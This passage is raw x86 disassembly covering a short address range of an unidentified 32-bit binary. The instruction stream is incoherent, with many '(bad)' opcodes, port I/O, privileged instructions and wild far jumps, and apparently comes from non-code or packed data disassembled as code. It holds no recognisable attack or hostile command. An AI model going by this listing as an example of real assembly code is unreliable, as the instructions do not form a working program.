  41686a:	add    BYTE PTR [eax+0x1d44],dl
  416870:	sbb    eax,0xe7ccac9c
  416875:	add    BYTE PTR [eax],al
  416877:	adc    bl,BYTE PTR [ebx+0x18]
  41687a:	adc    eax,0x93fb54ef
  41687f:	adc    al,0xf8
  416881:	mov    cl,0x8f
  416883:	fdiv   st(3),st
  416885:	ins    BYTE PTR es:[edi],dx
  416886:	sbb    eax,0x25c4f86b
  41688b:	add    BYTE PTR [eax],al
  41688d:	ins    DWORD PTR es:[edi],dx
  41688e:	ffreep st(4)
  416890:	ins    DWORD PTR es:[edi],dx
  416891:	add    BYTE PTR [eax],al
  416893:	xchg   ebp,eax
  416894:	fisub  DWORD PTR [edx-0x47]
  416897:	jbe    0x4168f9
  416899:	in     al,dx
  41689a:	dec    ax
  41689c:	in     al,0x0
  41689e:	add    BYTE PTR [edi+0x78],bl
  4168a1:	outs   dx,DWORD PTR ds:[esi]
  4168a2:	xor    DWORD PTR [ebx+0x6d],esi
  4168a5:	sbb    esp,DWORD PTR [edi-0x53]
  4168a8:	mov    eax,ds:0xae497fce
  4168ad:	stos   DWORD PTR es:[edi],eax
  4168ae:	pop    ebx
  4168af:	stc    
  4168b0:	jmp    0x861a5d4a
  4168b5:	or     al,0xc9
  4168b7:	add    BYTE PTR [eax],al
  4168b9:	mov    esi,gs
  4168bb:	add    BYTE PTR [eax],al
  4168bd:	xchg   DWORD PTR [esi+eiz*2+0x73],ebp
  4168c1:	mov    cl,0x78
  4168c3:	sti    
  4168c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c5:	xchg   edx,eax
  4168c6:	pop    esi
  4168c7:	dec    esi
  4168c8:	mov    ebx,0x5eab70e0
  4168cd:	in     eax,0xbb
  4168cf:	mov    dh,0xb
  4168d1:	pop    esp
  4168d2:	icebp  
  4168d3:	cmc    
  4168d4:	pop    eax
  4168d5:	call   0x61cd06cf
  4168da:	lds    esp,FWORD PTR [edx+0x23]
  4168dd:	mov    DWORD PTR [edi+0x73],esi
  4168e0:	or     eax,0xd1fa1c2c
  4168e5:	sub    ebx,edx
  4168e7:	je     0x4168c3
  4168e9:	push   es
  4168ea:	jecxz  0x4168f8
  4168ec:	push   ecx
  4168ed:	add    BYTE PTR [eax],al
  4168ef:	sub    ecx,DWORD PTR ds:0xcb6fbfd2
  4168f5:	mov    edx,0x5a35e202
  4168fa:	retf   
  4168fb:	pop    ebx
  4168fc:	out    0x69,eax
  4168fe:	leave  
  4168ff:	test   al,0x3c
  416901:	mov    dh,0x14
  416903:	out    0xd3,al
  416905:	out    dx,al
  416906:	pop    ecx
  416907:	aaa    
  416908:	dec    esp
  416909:	jmp    0x452c690e
  41690e:	sub    al,0x0
  416910:	add    BYTE PTR [ebx],dh
  416912:	jo     0x41697c
  416914:	dec    esp
  416915:	repz add BYTE PTR [eax],al
  416918:	addr16 jmp 0x4168c4
  41691b:	into   
  41691c:	push   eax
  41691d:	not    BYTE PTR [ecx+0x3e]
  416920:	mov    ds:0xd9099bbb,eax
  416925:	sbb    ah,BYTE PTR [ecx+0x4f]
  416928:	out    0xe9,eax
  41692a:	not    BYTE PTR [eax+0x2008e655]
  416930:	add    BYTE PTR [eax],al
  416932:	push   ebx
  416933:	ins    DWORD PTR es:[edi],dx
  416934:	shl    dh,1
  416936:	jl     0x416901
  416938:	cdq    
  416939:	shl    DWORD PTR [ebp+edx*8-0x51dcc52c],1
  416940:	dec    ecx
  416941:	test   DWORD PTR [eax-0x2dad0877],edi
  416947:	lock push eax
  416949:	inc    ebp
  41694a:	mov    dh,0x1
  41694c:	(bad)
  416951:	add    BYTE PTR [ebx+0x18],cl
  416954:	ds test al,0x5d
  416957:	dec    ecx
  416958:	cmp    ebx,esp
  41695a:	daa    
  41695b:	jmp    0x9ccf7c6
  416960:	push   edx
  416961:	pop    ecx
  416962:	fidivr DWORD PTR [esi+0x10751ab1]
  416968:	xor    DWORD PTR [esi],0x52
  41696b:	lock pusha 
  41696d:	dec    esi
  41696e:	(bad)  
  41696f:	ins    BYTE PTR es:[edi],dx
  416970:	push   ebx
  416971:	cmp    DWORD PTR [ebx],esi
  416973:	cdq    
  416974:	pushf  
  416975:	sti    
  416976:	fs leave 
  416978:	inc    dx
  41697a:	jp     0x4169a1
  41697c:	push   cs
  41697d:	out    0x23,al
  41697f:	cwde   
  416980:	or     DWORD PTR [ebp+0x7eeb179e],ebx
  416986:	jb     0x4169df
  416988:	in     al,0x7e
  41698a:	cld    
  41698b:	adc    DWORD PTR [esi+eax*1],edi
  41698e:	sub    BYTE PTR [edi-0x7b],dh
  416991:	mov    edi,0xd511a599
  416996:	mov    bh,0x1d
  416998:	call   0x6c00:0xafc887
  41699f:	aaa    
  4169a0:	dec    esi
  4169a1:	shl    ah,0x0
  4169a4:	add    BYTE PTR [esi+0x69],ah
  4169a7:	bound  edi,QWORD PTR ds:0x2a769732
  4169ad:	rcl    DWORD PTR [ebx+0x27],1
  4169b0:	jnp    0x4169d8
  4169b2:	sub    BYTE PTR ds:[edi],bh
  4169b5:	bound  ecx,QWORD PTR [ebp+0x12]
  4169b8:	(bad)  
  4169ba:	sbb    al,0x89
  4169bc:	dec    ebp
  4169bd:	xchg   esi,eax
  4169be:	jp     0x416983
  4169c0:	dec    esp
  4169c1:	jbe    0x4169c3
  4169c3:	add    bh,ch
  4169c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c6:	xor    cl,BYTE PTR [esi+0xd9c80f]
  4169cc:	add    BYTE PTR [ecx+ebx*8-0x6c1a425e],dl
  4169d3:	xor    bl,BYTE PTR [edx+0xb8c4e]
  4169d9:	add    BYTE PTR [esi+0x84c2c1e],al
  4169df:	add    BYTE PTR [eax],al
  4169e1:	mov    edi,0xd40870
  4169e6:	add    bl,al
  4169e8:	mov    ecx,0xa4a402ed
  4169ed:	lock inc edi
  4169ef:	jo     0x4169ca
  4169f1:	inc    edi
  4169f2:	in     al,0x22
  4169f4:	pop    esp
  4169f5:	pop    eax
  4169f6:	or     DWORD PTR [esi+eiz*8],esi
  4169f9:	(bad)  
  4169fa:	sti    
  4169fb:	sub    al,0x5
  4169fd:	adc    al,0x0
  4169ff:	out    0x0,eax
  416a01:	add    BYTE PTR [edi-0x41],bh
  416a04:	loopne 0x4169b2
  416a06:	lods   eax,DWORD PTR ds:[esi]
  416a07:	stos   BYTE PTR es:[edi],al
  416a08:	inc    ebx
  416a09:	mov    dh,0x5a
  416a0b:	rcl    DWORD PTR [ebx+ebp*4+0x14],0xda
  416a10:	mov    al,ds:0x5b8dafd8
  416a15:	push   edi
  416a16:	jl     0x416a39
  416a18:	mov    bl,0x8
  416a1a:	jg     0x416a1c
  416a1c:	add    BYTE PTR ds:0xd319d6a,ah
  416a22:	sub    eax,0xf5a21d74
  416a27:	bound  ecx,QWORD PTR [esi+0x45ba72e2]
  416a2d:	call   DWORD PTR gs:[ebx+0x1572a19c]
  416a34:	mov    eax,0x5ace1390
  416a39:	inc    edi
  416a3a:	dec    ebx
  416a3b:	or     al,0x36
  416a3d:	add    BYTE PTR [eax],al
  416a3f:	icebp  
  416a40:	adc    al,0xfe
  416a42:	arpl   WORD PTR [edx-0x6fa5633],ax
  416a48:	dec    esp
  416a49:	das    
  416a4a:	add    BYTE PTR [eax],al
  416a4c:	cmp    eax,0xb048
  416a51:	cmp    al,0x9f
  416a53:	sub    edi,DWORD PTR [ebp+eiz*2+0x5b]
  416a57:	jbe    0x416ad5
  416a59:	aaa    
  416a5a:	arpl   dx,ax
  416a5c:	hlt    
  416a5d:	and    ah,BYTE PTR [edx-0x1097fc32]
  416a63:	dec    ecx
  416a64:	aaa    
  416a65:	pop    edx
  416a66:	cmp    ah,dl
  416a68:	hlt    
  416a69:	shl    DWORD PTR [ebp+0x3582d7f2],1
  416a6f:	xchg   esp,eax
  416a70:	adc    dl,dl
  416a72:	pop    esp
  416a73:	fisubr DWORD PTR [eax+ebp*1]
  416a76:	outs   dx,BYTE PTR ds:[esi]
  416a77:	dec    esp
  416a78:	js     0x416a7a
  416a7a:	add    ch,bh
  416a7c:	xchg   ecx,eax
  416a7d:	fdivrp st(6),st
  416a7f:	sbb    al,0x17
  416a81:	in     al,0xdc
  416a83:	repz and BYTE PTR [eax],ch
  416a86:	fwait
  416a87:	cmovne ecx,esi
  416a8a:	(bad)  
  416a8b:	fild   WORD PTR [ebx+0x78]
  416a8e:	xchg   esi,eax
  416a8f:	mov    BYTE PTR [ebp+0x0],dl
  416a92:	add    BYTE PTR [ebx-0x25000ed6],dh
  416a98:	out    0xd0,eax
  416a9a:	sub    ecx,edi
  416a9c:	scas   al,BYTE PTR es:[edi]
  416a9d:	into   
  416a9e:	lea    eax,[ebx+edi*4-0x2e3f0000]
  416aa5:	jnp    0x416a95
  416aa7:	sldt   ecx
  416aaa:	add    BYTE PTR [eax],al
  416aac:	jnp    0x416b1d
  416aae:	add    edx,ebp
  416ab0:	scas   al,BYTE PTR es:[edi]
  416ab1:	pop    edi
  416ab2:	fisubr WORD PTR [eax-0x62d04139]
  416ab8:	push   edx
  416ab9:	xchg   esi,eax
  416aba:	lods   eax,DWORD PTR ds:[esi]
  416abb:	push   es
  416abc:	push   ebp
  416abd:	xor    DWORD PTR [ebx],edi
  416abf:	sbb    edi,DWORD PTR [edi+0x23]
  416ac2:	sub    ah,ch
  416ac4:	jns    0x416b0a
  416ac6:	test   DWORD PTR [eax],eax
  416ac8:	add    dl,ah
  416aca:	sub    esi,DWORD PTR [edi-0x76054844]
  416ad0:	pop    es
  416ad1:	inc    esi
  416ad2:	pop    ebx
  416ad3:	pusha  
  416ad4:	mov    dh,0x23
  416ad6:	aam    0xe4
  416ad8:	fwait
  416ad9:	xchg   ch,bh
  416adb:	mov    edi,DWORD PTR [eax+ecx*1+0x24]
  416adf:	add    BYTE PTR [eax],al
  416ae1:	add    DWORD PTR [esi],0xfffffff8
  416ae4:	push   ds
  416ae5:	cdq    
  416ae6:	and    esp,DWORD PTR [edi]
  416ae8:	test   eax,0x363c8baa
  416aed:	push   esp
  416aef:	lods   al,BYTE PTR ds:[esi]
  416af0:	(bad)  
  416af1:	(bad)  
  416af2:	nop
  416af3:	loope  0x416ac3
  416af5:	fsubr  DWORD PTR [esi+0xb]
  416af8:	fnstcw WORD PTR [edi+0x38]
  416afb:	mov    dl,0x12
  416afd:	fs aas 
  416aff:	fnstsw WORD PTR [esi]
  416b01:	and    DWORD PTR [esi+0xf90c],ecx
  416b07:	xchg   esp,eax
  416b08:	mov    ebx,0xa8abcd97
  416b0d:	pop    esp
  416b0e:	xor    eax,0x571e3a7d
  416b13:	imul   eax,DWORD PTR [ebx+0x2fc967b3],0x481e9d50
  416b1d:	mov    ch,0x0
  416b1f:	add    BYTE PTR [eax-0x601690fb],dl
  416b25:	and    al,0x40
  416b27:	jns    0x416b29
  416b29:	add    BYTE PTR [eax],dh
  416b2b:	jnp    0x416ae4
  416b2d:	inc    edx
  416b2e:	neg    BYTE PTR [edi+esi*4-0x34486822]
  416b35:	push   esi
  416b36:	push   edx
  416b37:	cdq    
  416b38:	jno    0x416ad9
  416b3a:	ja     0x416b73
  416b3c:	mov    cl,0xa7
  416b3e:	test   al,0x66
  416b40:	push   ebp
  416b41:	push   ss
  416b42:	and    ebp,eax
  416b44:	(bad)  
  416b45:	nop
  416b46:	aam    0x61
  416b48:	add    ecx,ecx
  416b4a:	icebp  
  416b4b:	js     0x416b75
  416b4d:	mov    edi,0x75577833
  416b52:	mov    dl,0xa4
  416b54:	mov    edi,0x85b3ef72
  416b59:	push   0x3545e17e
  416b5e:	repnz add al,0xac
  416b61:	add    BYTE PTR [eax],al
  416b63:	int3   
  416b64:	inc    BYTE PTR [eax]
  416b66:	add    BYTE PTR [ecx+0x72],al
  416b69:	inc    edx
  416b6a:	clc    
  416b6b:	in     al,0xe
  416b6d:	iret   
  416b6e:	shr    BYTE PTR [edi+0x6],cl
  416b71:	idiv   al
  416b73:	cmp    eax,edi
  416b75:	push   ds
  416b76:	rcl    BYTE PTR [ebx],cl
  416b78:	add    ebx,DWORD PTR [eax+0x35e4a0f0]
  416b7e:	inc    BYTE PTR [esi-0x76]
  416b81:	mov    eax,ds:0x353fd24d
  416b86:	pop    ebx
  416b87:	test   DWORD PTR ss:[edi-0xdeeb6],ecx
  416b8e:	xchg   edx,eax
  416b8f:	inc    esp
  416b90:	xor    eax,0x19620000
  416b95:	push   cs
  416b96:	push   ebp
  416b97:	mov    esi,0x339d4375
  416b9c:	xor    edx,esi
  416b9e:	(bad)  
  416b9f:	out    dx,eax
  416ba0:	dec    esi
  416ba1:	jae    0x416c03
  416ba3:	mov    al,0x3f
  416ba5:	imul   ecx,esp,0xffffffe1
  416ba8:	add    BYTE PTR [eax],al
  416baa:	add    ch,dl
  416bac:	add    BYTE PTR [eax],al
  416bae:	ret    
  416baf:	int3   
  416bb0:	add    eax,0xffd30000
  416bb5:	inc    eax
  416bb6:	xor    eax,DWORD PTR [eax]
  416bb8:	add    bl,cl
  416bba:	sub    BYTE PTR [eax+0x25fb0000],0xc3
  416bc1:	adc    di,WORD PTR [esi]
  416bc4:	lock jb 0x416bda
  416bc7:	jp     0x416bbe
  416bc9:	xchg   esp,eax
  416bca:	cmp    eax,0x3b7fd675
  416bcf:	outs   dx,BYTE PTR ds:[esi]
  416bd0:	stos   BYTE PTR es:[edi],al
  416bd1:	ror    DWORD PTR [ecx],cl
  416bd3:	adc    ecx,DWORD PTR [esi+0x474c966c]
  416bd9:	add    BYTE PTR [eax],al
  416bdb:	xor    al,0xb2
  416bdd:	cmp    al,0x73
  416bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416be0:	out    dx,al
  416be1:	mov    al,ds:0x909d1b50
  416be6:	in     eax,dx
  416be7:	in     eax,dx
  416be8:	jle    0x416c52
  416bea:	adc    BYTE PTR [edx-0x30ae5add],ch
  416bf0:	mov    cl,0xe8
  416bf2:	int    0x51
  416bf4:	fistp  DWORD PTR [edx-0x3f]
  416bf7:	mov    bh,BYTE PTR [ebx+0x1]
  416bfa:	push   eax
  416bfb:	adc    DWORD PTR [eax+0x38],eax
  416bfe:	add    BYTE PTR [eax],al
  416c00:	bound  eax,QWORD PTR [edx+eiz*2]
  416c03:	add    BYTE PTR [eax],al
  416c05:	fcomi  st,st(2)
  416c07:	adc    DWORD PTR [ecx],0x5d
  416c0a:	xchg   esp,eax
  416c0b:	xchg   BYTE PTR [esi-0x2c],bh
  416c0e:	mov    ebp,0x704
  416c13:	pusha  
  416c14:	repz js 0x416c57
  416c17:	add    DWORD PTR [eax],0x0
  416c1a:	(bad)  
  416c1b:	jmp    0xf6147e62
  416c20:	pop    edi
  416c21:	inc    esi
  416c22:	mov    ebx,0xbacc
  416c27:	inc    edi
  416c28:	jg     0x416c99
  416c2a:	jp     0x416c83
  416c2c:	or     ebp,0xed8b21f1
  416c32:	clc    
  416c33:	xlat   BYTE PTR ds:[ebx]
  416c34:	jae    0x416bcc
  416c36:	mov    bl,0x52
  416c38:	inc    esi
  416c39:	xchg   ebp,eax
  416c3a:	(bad)  
  416c3b:	lock jg 0x416c2b
  416c3e:	inc    edi
  416c3f:	sub    BYTE PTR [ebx],bl
  416c41:	pop    ss
  416c42:	mov    ah,0xd3
  416c44:	test   al,0x2e
  416c46:	mov    ds:0x4b2d6d2b,al
  416c4b:	push   es
  416c4c:	jge    0x416ca4
  416c4e:	add    edi,esi
  416c50:	out    dx,al
  416c51:	pop    es
  416c52:	test   al,bh
  416c54:	add    BYTE PTR [eax],al
  416c56:	test   BYTE PTR [ebx+0x5eb20000],dh
  416c5c:	mov    ch,0xa5
  416c5e:	cmp    DWORD PTR [edi-0x3c91d781],edx
  416c64:	and    dh,BYTE PTR [ebx+0x6c]
  416c67:	adc    DWORD PTR [ecx-0x2f6b8143],eax
  416c6d:	push   0x4140
  416c72:	int    0xed
  416c74:	sub    ch,dl
  416c76:	inc    eax
  416c77:	test   DWORD PTR [eax],0x22b2c700
  416c7d:	outs   dx,DWORD PTR ds:[esi]
  416c7e:	cmp    DWORD PTR [bp+0x67],esi
  416c82:	lahf   
  416c83:	cs test eax,0xac0138b3
  416c89:	dec    edi
  416c8a:	xchg   BYTE PTR [edi+eiz*4],al
  416c8d:	add    BYTE PTR [eax],al
  416c8f:	cmp    ebp,DWORD PTR [ecx+ebp*2]
  416c92:	inc    DWORD PTR [ebp-0x6]
  416c95:	or     BYTE PTR [ecx-0x5af4aabd],0x99
  416c9c:	cmp    BYTE PTR [ebx+0x5ef3a4a],bh
  416ca2:	mov    ecx,0x9082bbcd
  416ca7:	cmp    DWORD PTR [ebx+edi*1-0x53],ebp
  416cab:	fmulp  st(5),st
  416cad:	fisub  WORD PTR [edx+0x41082c]
  416cb3:	add    ah,al
  416cb5:	or     eax,DWORD PTR [eax]
  416cb7:	add    BYTE PTR [edx-0x59],dh
  416cba:	mov    dl,0x26
  416cbc:	push   esi
  416cbd:	xor    eax,0x4f68143c
  416cc2:	mov    bl,0x5d
  416cc4:	and    dl,BYTE PTR [esi+ebp*1+0x1d62f65f]
  416ccb:	sahf   
  416ccc:	pop    esp
  416ccd:	das    
  416cce:	es jge 0x416c6c
  416cd1:	push   ss
  416cd2:	xchg   ebp,eax
  416cd3:	retf   
  416cd4:	xchg   ecx,eax
  416cd5:	xor    edx,edi
  416cd7:	loopne 0x416cec
  416cd9:	push   ecx
  416cda:	pop    ss
  416cdb:	mov    BYTE PTR [eax],dh
  416cdd:	add    BYTE PTR [eax],al
  416cdf:	inc    esp
  416ce0:	fadd   DWORD PTR [eax]
  416ce2:	add    BYTE PTR [ebx+0x67e0536f],cl
  416ce8:	dec    ebx
  416ce9:	jl     0x416d0c
  416ceb:	in     eax,0xb7
  416ced:	mov    esi,0xfd5e751e
  416cf2:	in     eax,0xfe
  416cf4:	or     ah,bl
  416cf6:	add    BYTE PTR [eax],al
  416cf8:	out    0x91,al
  416cfa:	loop   0x416cf8
  416cfc:	out    dx,al
  416cfd:	xchg   esp,eax
  416cfe:	mov    esi,0xa2ac49fa
  416d03:	mov    ds:0x5f1bc377,eax
  416d08:	jo     0x416ca3
  416d0a:	out    dx,eax
  416d0b:	pop    edi
  416d0c:	mov    ch,BYTE PTR [ebp+0x29]
  416d0f:	jb     0x416cbf
  416d11:	arpl   bp,dx
  416d13:	jns    0x416d44
  416d15:	int3   
  416d16:	sbb    al,BYTE PTR [eax]
  416d18:	add    dh,dl
  416d1a:	mov    bh,BYTE PTR [edi+0x492faafd]
  416d20:	or     al,0x40
  416d22:	add    BYTE PTR [eax],al
  416d24:	loopne 0x416cb3
  416d26:	mov    WORD PTR [ecx],gs
  416d28:	add    BYTE PTR [eax],al
  416d2a:	lea    edx,[eax-0x3e]
  416d2d:	mov    ss,WORD PTR [ebx+0x2e]
  416d30:	into   
  416d31:	xchg   edi,eax
  416d32:	sub    al,0x53
  416d34:	fwait
  416d35:	inc    edi
  416d36:	inc    edx
  416d37:	bound  ecx,QWORD PTR [ebx-0x1cb4a456]
  416d3d:	mov    dh,0x60
  416d3f:	dec    ecx
  416d40:	mov    dh,0x5
  416d42:	icebp  
  416d43:	sbb    esi,DWORD PTR [edi]
  416d45:	sbb    eax,0xf8314231
  416d4a:	lods   eax,DWORD PTR ds:[esi]
  416d4b:	aad    0x18
  416d4d:	icebp  
  416d4e:	push   ebp
  416d4f:	ret    0x78a0
  416d52:	dec    edi
  416d53:	add    al,0x2a
  416d55:	add    BYTE PTR [eax],al
  416d57:	repnz xor BYTE PTR [edi],dl
  416d5a:	push   edx
  416d5b:	imul   edx,DWORD PTR [esi+eiz*4-0x2284fde],0xffffffe6
  416d63:	add    dh,BYTE PTR [ecx+0x117eeedb]
  416d69:	sbb    eax,0xbaff0af1
  416d6e:	sbb    BYTE PTR [ecx-0x22],cl
  416d71:	repz es cli 
  416d74:	repz (bad) 
  416d77:	ror    DWORD PTR [ecx+0x708c24d6],cl
  416d7d:	add    BYTE PTR [eax],al
  416d7f:	repnz sub eax,0xf946c11d
  416d85:	dec    esi
  416d86:	xchg   edi,eax
  416d87:	or     eax,0xbbfe09a0
  416d8c:	dec    ebp
  416d8d:	pop    ss
  416d8e:	mov    BYTE PTR [ebx+0x75],0xaa
  416d92:	cmp    DWORD PTR [edx-0x39],0x7c20f793
  416d99:	mov    bh,0xb3
  416d9b:	inc    ebx
  416d9c:	add    al,0xb4
  416d9e:	add    BYTE PTR [eax],al
  416da0:	jl     0x416dc7
  416da2:	jnp    0x416d7d
  416da4:	mov    ah,0x50
  416da6:	sub    eax,0x29cc
  416dab:	sub    eax,0x1931641f
  416db0:	add    ah,BYTE PTR [ecx+eiz*2-0x5bf41e72]
  416db7:	xchg   ebx,eax
  416db8:	add    BYTE PTR [ebx+0x0],bh
  416dbb:	add    dl,dh
  416dbd:	sahf   
  416dbe:	fadd   st(2),st
  416dc0:	je     0x416dfd
  416dc2:	sbb    edx,DWORD PTR ds:0x394274c3
  416dc8:	arpl   WORD PTR [ebp-0x60e823c2],sp
  416dce:	jbe    0x416de0
  416dd0:	dec    ebx
  416dd1:	gs jle 0x416d97
  416dd4:	sub    ecx,DWORD PTR [ebx+0x738a41bf]
  416dda:	jl     0x416d7a
  416ddc:	retf   0x24ea
  416ddf:	mov    ebp,DWORD PTR [ebx-0x17]
  416de2:	dec    ecx
  416de3:	call   FWORD PTR [ecx-0x74]
  416de6:	add    BYTE PTR ss:[eax],al
  416de9:	push   esi
  416dea:	loop   0x416e62
  416dec:	jb     0x416df4
  416dee:	lods   eax,DWORD PTR ds:[esi]
  416def:	add    eax,0xcf46af37
  416df4:	and    BYTE PTR [edi+0x9],ah
  416df7:	adc    edi,eax
  416df9:	cmp    eax,DWORD PTR [edi]
  416dfb:	pop    ebp
  416dfc:	and    al,0x3e
  416dfe:	xchg   edi,eax
  416dff:	adc    al,0xf7
  416e01:	stos   BYTE PTR es:[edi],al
  416e02:	scas   al,BYTE PTR es:[edi]
  416e03:	jmp    0xc73d:0x4992bf5a
  416e0a:	int3   
  416e0b:	or     al,BYTE PTR [eax]
  416e0d:	add    BYTE PTR [edx+0x37],dh
  416e10:	fcmove st,st(2)
  416e12:	sub    eax,0x6037ff2c
  416e17:	adc    dh,BYTE PTR [esi-0x263e1b91]
  416e1d:	ret    0xf0ae
  416e20:	out    0xcc,eax
  416e22:	push   edx
  416e23:	add    BYTE PTR [eax],al
  416e25:	pop    ebx
  416e26:	(bad)  
  416e27:	loopne 0x416e90
  416e29:	pop    ebx
  416e2a:	cmp    al,0xa5
  416e2c:	scas   al,BYTE PTR es:[edi]
  416e2d:	cmp    dh,BYTE PTR [edi+ebp*2]
  416e30:	push   ss
  416e31:	jmp    0x79b6ec7f
  416e36:	cdq    
  416e37:	int    0x45
  416e39:	mov    dl,0x8e
  416e3b:	popf   
  416e3c:	into   
  416e3d:	outs   dx,DWORD PTR ds:[esi]
  416e3e:	pop    ss
  416e3f:	cmp    eax,edi
  416e41:	outs   dx,BYTE PTR ds:[esi]
  416e42:	or     al,0x33
  416e44:	add    BYTE PTR [eax],al
  416e46:	jne    0x416e27
  416e48:	jno    0x416eac
  416e4a:	lock pop esp
  416e4c:	xchg   DWORD PTR [edi-0x2d],ebp
  416e4f:	pop    eax
  416e50:	idiv   BYTE PTR [edx-0xf]
  416e53:	retf   
  416e54:	pop    ss
  416e55:	pop    es
  416e56:	cmp    BYTE PTR [ebp+0x28e595ec],ah
  416e5c:	fldenv [ebx]
  416e5e:	pop    esi
  416e5f:	jb     0x416e9a
  416e61:	fstp   QWORD PTR [esi]
  416e63:	jp     0x416ebb
  416e65:	cmp    eax,0x2a2ff801
  416e6a:	push   ds
  416e6b:	mov    bl,0x41
  416e6d:	fneni(8087 only) 
  416e6f:	adc    BYTE PTR [edi],dl
  416e71:	jmp    0x59df321f
  416e76:	or     al,0x57
  416e78:	add    BYTE PTR [eax],al
  416e7a:	jl     0x416e38
  416e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7d:	xchg   ebx,esi
  416e7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e80:	sahf   
  416e81:	pusha  
  416e82:	dec    edx
  416e83:	pushf  
  416e84:	cmc    
  416e85:	and    eax,DWORD PTR [esi+0x14a43cd4]
  416e8b:	lea    esp,[ebp+ebx*2-0x1b96cf6e]
  416e92:	or     BYTE PTR [eax+0x0],cl
  416e95:	add    BYTE PTR [eax-0x7279df0f],ch
  416e9b:	jae    0x416eb9
  416e9d:	and    al,0x33
  416e9f:	or     DWORD PTR [esi+0x47c0],ecx
  416ea5:	pop    es
  416ea6:	or     al,0x79
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	add    ecx,ebp
  416eac:	into   
  416ead:	cmp    BYTE PTR [esi+0x237f8531],dh
  416eb3:	sar    DWORD PTR [ebp+0x4a],cl
  416eb6:	jo     0x416eea
  416eb8:	scas   al,BYTE PTR es:[edi]
  416eb9:	add    eax,0x342975b4
  416ebe:	mov    cl,0x65
  416ec0:	mov    esp,DWORD PTR ds:0x5a26428e
  416ec6:	jecxz  0x416e5b
  416ec8:	cmc    
  416ec9:	in     al,dx
  416eca:	loop   0x416f24
  416ecc:	xchg   edx,eax
  416ecd:	mov    eax,ds:0xef7b4338
  416ed2:	fs adc esi,ecx
  416ed5:	cdq    
  416ed6:	xchg   ecx,eax
  416ed7:	xchg   ebx,eax
  416ed8:	mov    edx,0x24f2d93e
  416edd:	or     edx,DWORD PTR ss:[ebp+0x4]
  416ee1:	pop    esp
  416ee2:	add    BYTE PTR [eax],al
  416ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ee5:	pop    ebx
  416ee6:	test   DWORD PTR [esi+0x766470d2],edx
  416eec:	adc    bh,BYTE PTR [edx-0x65]
  416eef:	sub    bl,BYTE PTR [ecx]
  416ef1:	sbb    eax,0x3f5ebb0f
  416ef6:	dec    esp
  416ef7:	rol    BYTE PTR [eax],0x0
  416efa:	rol    DWORD PTR ds:0x3c419ed9,cl
  416f00:	xchg   ecx,eax
  416f01:	daa    
  416f02:	dec    edx
  416f03:	or     BYTE PTR [edi+0x0],cl
  416f06:	add    BYTE PTR [edx],ch
  416f08:	xlat   BYTE PTR ds:[ebx]
  416f09:	inc    esp
  416f0a:	and    BYTE PTR [eax],al
  416f0c:	add    BYTE PTR [edi-0x2ef97537],ch
  416f12:	xor    cl,al
  416f14:	pop    ebp
  416f15:	push   0x142bc209
  416f1a:	xchg   edx,eax
  416f1b:	aam    0x44
  416f1d:	mov    DWORD PTR [eax],eax
  416f1f:	add    BYTE PTR [eax+0x224c],ah
  416f25:	add    BYTE PTR [eax],dl
  416f27:	add    BYTE PTR [eax],al
  416f29:	test   al,0x72
  416f2b:	cmovp  esp,DWORD PTR [ecx+ebx*2-0x62]
  416f30:	inc    eax
  416f31:	aad    0x0
  416f33:	add    BYTE PTR [eax+0x7b],ch
  416f36:	cmp    bl,BYTE PTR [eax-0x42]
  416f39:	call   0x41a842
  416f3e:	dec    esi
  416f3f:	sbb    al,0xb2
  416f41:	lock out dx,eax
  416f43:	daa    
  416f44:	cmp    BYTE PTR ds:0xc248,ch
  416f4a:	js     0x416fcb
  416f4c:	adc    al,0xb0
  416f4e:	jle    0x416f34
  416f50:	xchg   ebx,eax
  416f51:	push   0x3a
  416f53:	mov    WORD PTR [edi-0x7a1b0000],cs
  416f59:	xchg   ecx,eax
  416f5a:	fs jmp 0x16e0:0xcfd49f6e
  416f62:	add    al,0x8a
  416f64:	add    BYTE PTR [eax],al
  416f66:	mov    bl,BYTE PTR [ecx+0x76c0aad2]
  416f6c:	add    BYTE PTR [eax],al
  416f6e:	(bad)  
  416f6f:	pusha  
  416f70:	jae    0x416f1f
  416f72:	ret    
  416f73:	xor    al,0x40
  416f75:	sub    al,BYTE PTR [eax]
  416f77:	add    ch,bl
  416f79:	cli    
  416f7a:	add    al,dl
  416f7c:	push   cs
  416f7d:	scas   eax,DWORD PTR es:[edi]
  416f7e:	sbb    DWORD PTR [ebx-0x79],eax
  416f81:	push   edx
  416f82:	mov    dl,0xce
  416f84:	sbb    eax,DWORD PTR [ecx+0x67c0]
  416f8a:	xor    al,0x6a
  416f8c:	inc    esi
  416f8d:	or     eax,0xfe81f3f3
  416f92:	repnz clc 
  416f94:	aas    
  416f95:	enter  0x21,0x0
  416f99:	and    edi,edx
  416f9b:	pop    ds
  416f9c:	mov    bl,0xbc
  416f9e:	clc    
  416f9f:	lods   al,BYTE PTR ds:[esi]
  416fa0:	hlt    
  416fa1:	pop    ss
  416fa2:	add    edx,DWORD PTR [ebp+0x2a]
  416fa5:	push   ss
  416fa6:	and    al,0xef
  416fa8:	and    al,0x67
  416faa:	xor    eax,0x64a3ecd7
  416faf:	out    dx,al
  416fb0:	pop    esp
  416fb1:	add    ah,bl
  416fb3:	add    BYTE PTR [eax],al
  416fb5:	gs pop ss
  416fb7:	cmp    ebp,ebx
  416fb9:	popa   
  416fba:	adc    edx,edx
  416fbc:	mov    edx,0x23823439
  416fc1:	xchg   dh,ah
  416fc3:	xchg   edx,eax
  416fc4:	mov    edx,fs
  416fc6:	add    BYTE PTR [eax],al
  416fc8:	jp     0x416fd5
  416fca:	or     ax,0x614d
  416fce:	jmp    0x5b61:0x4d32d62a
  416fd5:	jl     0x417049
  416fd7:	pop    esp
  416fd8:	dec    ebp
  416fd9:	and    dl,al
  416fdb:	mov    dl,0xc1
  416fdd:	aaa    
  416fde:	cmp    DWORD PTR [edi+0x72],0xebbf87c6
  416fe5:	push   ebp
  416fe6:	jo     0x41704d
  416fe8:	jecxz  0x416faf
  416fea:	jae    0x417051
  416fec:	(bad)  
  416fee:	repz mov eax,0xc0da5ed0
